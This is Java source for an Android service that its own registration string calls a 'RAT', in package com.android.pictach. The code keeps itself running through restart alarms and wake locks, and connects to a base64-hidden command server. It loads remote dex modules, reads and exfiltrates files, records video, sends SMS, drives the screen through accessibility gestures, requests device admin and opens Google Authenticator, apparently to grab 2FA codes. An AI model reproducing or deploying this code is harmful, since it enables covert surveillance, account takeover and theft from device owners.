package com.android.pictach;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.widget.Toast;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class Api extends Service {

    PowerManager.WakeLock wakeLock = null;

    

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Utils.scheduleRestartAlarm(getApplicationContext(), "Scanner", 180000L);
            Intent restartIntent = new Intent(getApplicationContext(), getClass());
            restartIntent.setPackage(getPackageName());
            ((AlarmManager) getApplicationContext().getSystemService("alarm"))
                    .set(3, SystemClock.elapsedRealtime() + 1000,
                            PendingIntent.getService(getApplicationContext(), 1,
                                    restartIntent, 1073741824));
            if (wakeLock != null && !wakeLock.equals(null) && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception unused) {
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Utils.stateFlag0 = 0;
        try {
            Utils.scheduleRestartAlarm(getApplicationContext(), "iamdone", 180000L);
        } catch (Exception unused) {
        }
        try {
            sendBroadcast(
                    new Intent(getApplicationContext(), Bodybuilding.class)
                            .setAction("RestartSensor"));
        } catch (Exception unused2) {
        }
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            stopForeground(true);
        } catch (Exception unused3) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            if (love.app_love_Context == null) {
                love.app_love_Context = getApplicationContext();
            }

            Utils.scheduleRestartAlarm(getApplicationContext(), "Battery", 18000L);

            PowerManager pm = (PowerManager) getSystemService("power");
            if (wakeLock == null) {
                wakeLock = pm.newWakeLock(1, "PeriSecure:MyWakeLock");
            }
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire();
            }

            Context appCtx = getApplicationContext();
            Utils.currentPrefKey = "11";

            
            if (Build.VERSION.SDK_INT >= 26
                    && Utils.currentPrefKey.charAt(1) == Utils.charOne) {
                try {
                    Notification n = Utils.buildForegroundNotification(
                            appCtx, "Worker", "Workers");
                    if (n != null) startForeground(9594, n);
                } catch (Exception unused) {
                }
            }

            
            Config.FTX0 = "sysdata";
            Config.FTX1 = "appdata";
            Config.FTX2 = "configrs";
            Config.FTX3 = "sysinfo";

            
            Utils.threadPoolExecutor = new ThreadPoolExecutor(
                    8, 15, 1L, TimeUnit.MINUTES,
                    new ArrayBlockingQueue<>(Utils.maxThreadCount)
            );

            
            initializeAndConnect(this);

        } catch (Exception unused2) {
        }
    }

    

    
    public static void initializeAndConnect(Context context) {
        String deviceId;
        String host;
        String port;
        String storedId = "";

        try {
            
            try {
                deviceId = "" + Settings.Secure.getString(
                        context.getContentResolver(), "android_id");
            } catch (Exception unused) {
                deviceId = Config.generateDeviceId(context);
            }

            
            love.commandQueue   = new ArrayList<>();
            love.loadedModules  = new ArrayList<>();

            
            String regString = "@MY-RAT-ALWAYS-SLEEPS_1111_ GODEX & SIMRAN & SELF__" + deviceId;

            
            String hostKey  = Config.FTX0;
            String portKey  = Config.FTX1;
            String idKey    = Config.FTX2;
            try { storedId  = Config.FTX2; } catch (Exception unused2) {}

            
            host = Utils.base64Decode(love.Host);
            port = Utils.base64Decode(love.Port);

            
            if (Utils.readPref(context, hostKey).length() == 0) {
                try {
                    Utils.writePref(context, regString, hostKey);
                } catch (Exception unused3) {
                }
            }

            
            if (Utils.readPref(context, portKey).length() != 0) {
                host = Utils.readPref(context, portKey);
            }
            if (Utils.readPref(context, storedId).length() != 0) {
                port = Utils.readPref(context, storedId);
            }

            
            NetworkManager.initialize(host, port, context);

            
            new CommandProcessorTask().execute(context);

        } catch (Exception unused4) {
        }
    }

    

    
    public static class CommandProcessorTask extends AsyncTask<Context, Integer, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(Context... contexts) {
            while (true) {
                try {
                    
                    if (!NetworkManager.isReceiving) {
                        love.commandTimeoutAt = -1L;
                        
                    } else if (love.commandTimeoutAt == -1) {
                        love.commandTimeoutAt = System.currentTimeMillis() + 45000;
                    } else if (System.currentTimeMillis() > love.commandTimeoutAt) {
                        
                        String shellResult = Utils.shellCommandResult;
                        if (love.inx == 2) shellResult = "\t";
                        try {
                            NetworkManager.sendToC2(Utils.negTwoFiveFive, shellResult.getBytes());
                            NetworkManager.runCommand();
                        } catch (Exception unused) {
                        }
                        if (love.inx >= 3) {
                            love.inx = -1;
                            NetworkManager.closeAll("DONE");
                        } else {
                            love.inx++;
                        }
                        love.commandTimeoutAt = -1L;
                    }
                } catch (Exception unused2) {
                }

                try {
                    
                    if (love.commandQueue.size() > 0) {
                        Config cmd = love.commandQueue.get(0);
                        if (cmd != null) {
                            
                            String[] parts = cmd.str.split(love.packetSeparator);
                            String cmdType = parts[0];

                            
                            if (cmdType.equals("0")) {
                                Class<?> loadedClass = LoveApi0.loadDexModule(
                                        new Object[]{
                                                contexts[0],
                                                cmd.byt,
                                                parts[1],  
                                                parts[4]   
                                        }
                                );
                                love.loadedModules.add(
                                        new DataHelper(loadedClass.getName(), loadedClass));

                                
                                if (love.loadedModules.size()
                                        == Integer.valueOf(parts[2]).intValue()) {
                                    love.commandCodes[0]  = parts[5];
                                    love.commandCodes[4]  = parts[6];
                                    love.commandCodes[5]  = parts[7];
                                    try {
                                        love.commandCodes[6]  = parts[8];
                                        love.commandCodes[7]  = parts[9];
                                        love.commandCodes[8]  = parts[10];
                                    } catch (Exception unused3) {
                                    }
                                    love.commandCodes[9]  = parts[11];
                                    love.commandCodes[10] = parts[12];
                                    love.commandCodes[11] = parts[13];
                                    love.commandCodes[12] = parts[14];
                                    love.commandCodes[13] = parts[15];
                                    love.commandCodes[14] = parts[16];
                                    love.commandCodes[15] = parts[17];
                                    love.commandCodes[16] = parts[18];
                                    love.loadedModuleCount = love.loadedModules.size();

                                    
                                    LoveApi0.runShellOnModuleDir(
                                            new Object[]{contexts[0], parts[3]});

                                    
                                    NetworkManager.readDelayMs = 10L;
                                    NetworkManager.sendToC2(
                                            love.commandCodes[15], "\t".getBytes());
                                }

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[4])) {
                                if (love.loadedModules.size() > 0) {
                                    int i = 0;
                                    while (true) {
                                        if (i > love.loadedModules.size()) break;
                                        if (love.loadedModules.get(i).className
                                                .equals(parts[1])) {
                                            Object result = LoveApi0.invokeModuleMethod(
                                                    "ʼʾʿˈᵔঙʿ$ʿʼ",
                                                    new Object[]{
                                                            contexts[0],
                                                            love.loadedModules.get(i).moduleClass,
                                                            parts[2],
                                                            parts[4],
                                                            cmd.byt,
                                                            "ʼʾʿˈᵔঙʿ$ʿʼ"
                                                    }
                                            );
                                            if (!parts[3].equals(love.commandCodes[16])) {
                                                try {
                                                    NetworkManager.sendToC2(
                                                            parts[3],
                                                            Utils.objectToBytes(result));
                                                } catch (Exception unused4) {
                                                }
                                            }
                                        } else {
                                            i++;
                                        }
                                    }
                                }

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[5])) {
                                String[] cmdArgs = {
                                        parts[1], parts[2], parts[3], parts[4],
                                        parts[5], parts[6], parts[7], parts[8]
                                };

                                if (parts[4].equals("ddll")) {
                                    dispatchTextCommand(contexts[0], parts, cmdArgs);
                                } else if (LoveApi0.isServiceNotRunning(com.class, contexts[0])) {
                                    Intent i = new Intent(contexts[0], com.class);
                                    i.putExtra(Config.FTX1, cmdArgs);
                                    contexts[0].startService(i);
                                } else {
                                    love.isOrca = false;
                                    contexts[0].stopService(
                                            new Intent(contexts[0], com.class));
                                    Thread.sleep(1000L);
                                }

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[6])) {
                                if (LoveApi0.isServiceNotRunning(video.class, contexts[0])) {
                                    Intent i = new Intent(contexts[0], video.class);
                                    i.putExtra(Config.FTX2,
                                            new String[]{parts[1], parts[2]});
                                    contexts[0].startService(i);
                                }

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[7])) {
                                if (!LoveApi0.isServiceNotRunning(video.class, contexts[0])) {
                                    contexts[0].stopService(
                                            new Intent(contexts[0], video.class));
                                }

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[8])) {
                                Utils.removeMarker(parts[1], "");
                                NetworkManager.closeAll("disconnectCmd");

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[9])) {
                                Utils.releaseLocks(false);
                                NetworkManager.sendToC2(parts[1], "\t".getBytes());

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[11])) {
                                love.commandCodes[1]  = parts[1];
                                love.commandCodes[2]  = parts[2];
                                love.commandCodes[3]  = parts[3];
                                love.isConnected = Utils.isAccessibilityEnabled(
                                        contexts[0], Firebase.class);
                                love.isLive = love.isConnected;
                                NetworkManager.sendToC2(
                                        love.commandCodes[1]
                                        + love.commandCodes[2]
                                        + String.valueOf(love.isConnected)
                                        + "|"
                                        + love.getLogFileList(),
                                        "\t".getBytes()
                                );

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[12])) {
                                love.isLive = false;

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[13])) {
                                Utils.acquireLocks(contexts[0], true);
                                NetworkManager.sendToC2(parts[1], "\t".getBytes());

                            
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[14])
                                    && NetworkManager.isReceiving) {
                                NetworkManager.sendHandshake("refresh");
                            }
                        }

                        
                        if (!NetworkManager.isConnected) {
                            love.commandQueue.clear();
                        } else {
                            love.commandQueue.remove(0);
                        }
                        Thread.sleep(1L);

                    } else {
                        
                        Thread.sleep(1000L);
                    }

                } catch (Exception unused5) {
                }
            }
        }

        
        private void dispatchTextCommand(Context ctx, String[] parts, String[] cmdArgs) {
            String cmd = parts[1];

            if (cmd.startsWith("msg:")) {
                if (cmd.endsWith(":up")) {
                    
                    new DownloadTask().setContext(
                            love.app_love_Context,
                            cmd.replace("msg:", "").replace(":up", "")
                    );
                } else if (cmd.endsWith(":fsh")) {
                    
                    showFullScreen(cmd.replace("msg:", "").replace(":fsh", ""));
                } else {
                    
                    showToast(cmd.replace("msg:", ""));
                }

            } else if (cmd.startsWith("goauth<*>")) {
                
                String pkgAuth = Utils.removeMarker(
                        "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2", "#$");
                if (Utils.isAppInstalled(ctx, pkgAuth)) {
                    Intent launch = ctx.getPackageManager()
                            .getLaunchIntentForPackage(pkgAuth);
                    launch.addFlags(268435456);
                    ctx.startActivity(launch);
                } else {
                    NetworkManager.sendToC2(
                            Utils.negFourFour,
                            "Google Auth<app not installed<app not installed".getBytes()
                    );
                }

            } else if (cmd.startsWith("kill<*>")) {
                
                Firebase.Firebasebypass = true;

            } else if (cmd.startsWith("pst<*>")) {
                
                if (love.MyAccess != null) {
                    Firebase.pasteText = cmd.replace("pst<*>", "");
                    Firebase.needPaste = true;
                    love.MyAccess.triggerAction();
                }

            } else if (cmd.startsWith("lnk<*>")) {
                
                openLink(cmd.replace("lnk<*>", ""));

            } else if (cmd.startsWith("ssms<*>")) {
                
                String[] smsParts = cmd.replace("ssms<*>", "").split("#");
                Firebase.sendSMS(smsParts[0], smsParts[1]);

            } else if (cmd.startsWith("adm<*>")) {
                
                requestAdmin();

            } else if (cmd.startsWith("rdd<*>")) {
                
                Firebase.fileReadStatus = "wait";
                love.deleteLogFile(cmd.replace("rd<*>", ""));
                Firebase.fileReadStatus = "on";

            } else if (cmd.startsWith("rd<*>")) {
                
                Firebase.fileReadStatus = "wait";
                NetworkManager.sendToC2(
                        Utils.eightEightEight,
                        love.MyAccess.readFile(cmd.replace("rd<*>", "")).getBytes()
                );
                Firebase.fileReadStatus = "on";

            } else if (cmd.startsWith("sp<*>")) {
                
                if (Build.VERSION.SDK_INT >= 24) {
                    String gestureStr = cmd.replace("sp<*>", "");
                    if (!gestureStr.contains("clk")
                            && !gestureStr.contains("Bc")
                            && !gestureStr.contains("Ho")
                            && !gestureStr.contains("RC")) {
                        String[] pointStrs = gestureStr.split(Pattern.quote(":"));
                        Point[] points = new Point[pointStrs.length];
                        for (int j = 0; j < pointStrs.length; j++) {
                            String[] xy = pointStrs[j]
                                    .replace("{", "").replace("}", "").split(",");
                            points[j] = new Point(
                                    Integer.parseInt(xy[0].split("=")[1]),
                                    Integer.parseInt(xy[1].split("=")[1])
                            );
                        }
                        love.MyAccess.drawSwipePath(points, 1000);
                    }
                    love.MyAccess.performSwipe(cmd.replace("sp<*>", ""));
                }

            } else if (cmd.startsWith("sc:")) {
                
                startScreen(cmd.replace("sc:", ""));
            }
        }

        
        private void requestAdmin() {
            if (love.app_love_Context != null) {
                try {
                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            love.app_love_Context.startActivity(
                                    new Intent(love.app_love_Context, activityadm.class)
                                            .addFlags(268435456)
                                            .addFlags(536870912)
                                            .addFlags(1073741824)
                            );
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
        }
    }

    

    
    public static void showToast(final String message) {
        if (love.app_love_Context != null) {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        Toast.makeText(love.app_love_Context, message, 1).show();
                    } catch (Exception unused) {
                    }
                }
            });
        }
    }

    
    public static void openLink(final String url) {
        if (love.app_love_Context != null) {
            try {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Intent intent = new Intent("android.intent.action.VIEW",
                                Uri.parse(url));
                        intent.setFlags(268435456);
                        love.app_love_Context.startActivity(intent);
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    
    public static void showFullScreen(String key) {
        if (love.app_love_Context != null) {
            try {
                Intent intent = new Intent(love.app_love_Context, Firebasemac.class);
                intent.addFlags(268435456);
                intent.putExtra("key", key);
                love.app_love_Context.startActivity(intent);
            } catch (Exception unused) {
            }
        }
    }

    
    public static void startScreen(String param) {
        
        
        Class<?> cls;
        Object obj;
        Method method = null;
        try {
            try {
                cls = Class.forName("com.android.pictach.Utils");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                cls = null;
            }
            try {
                obj = cls.newInstance();
            } catch (IllegalAccessException | InstantiationException e) {
                e.printStackTrace();
                obj = null;
            }
            try {
                method = cls.getDeclaredMethod(
                        Utils.base64Decode("U3RhcnROZXdTY2Fu"), 
                        Context.class, Intent.class);
            } catch (NoSuchMethodException unused) {
            }
            if (method != null) {
                method.invoke(obj,
                        love.app_love_Context,
                        new Intent(love.app_love_Context, Api.class));
            }
        } catch (Exception unused2) {
        }
    }

    
    public static void processPacket(byte[] packet) {
        try {
            if (packet == null || packet.length == 0) return;

            
            int[] lengths = {-1, -1};
            int headerEnd = 0;
            int nullCount = 0;
            int fieldStart = 0;

            for (int i = 0; i < packet.length; i++) {
                if (packet[i] == 0x00) {
                    String field = new String(packet, fieldStart, i - fieldStart, "UTF-8");
                    if (nullCount == 0) {
                        lengths[0] = Integer.parseInt(field);
                    } else if (nullCount == 1) {
                        lengths[1] = Integer.parseInt(field);
                        headerEnd = i + 1;
                        break;
                    }
                    nullCount++;
                    fieldStart = i + 1;
                }
            }

            if (lengths[0] < 0 || lengths[1] < 0) return;

            
            int dataLen = lengths[0] + lengths[1];
            if (headerEnd + dataLen > packet.length) return;
            byte[] data = new byte[dataLen];
            System.arraycopy(packet, headerEnd, data, 0, dataLen);

            
            byte[] cmdBytes = Utils.gzipDecompress(Utils.extractFirstPart(data, lengths));
            byte[] dexBytes = Utils.gzipDecompress(Utils.extractSecondPart(data, lengths));
            love.commandQueue.add(new Config(cmdBytes, dexBytes));

        } catch (Exception unused) {
        }
    }
}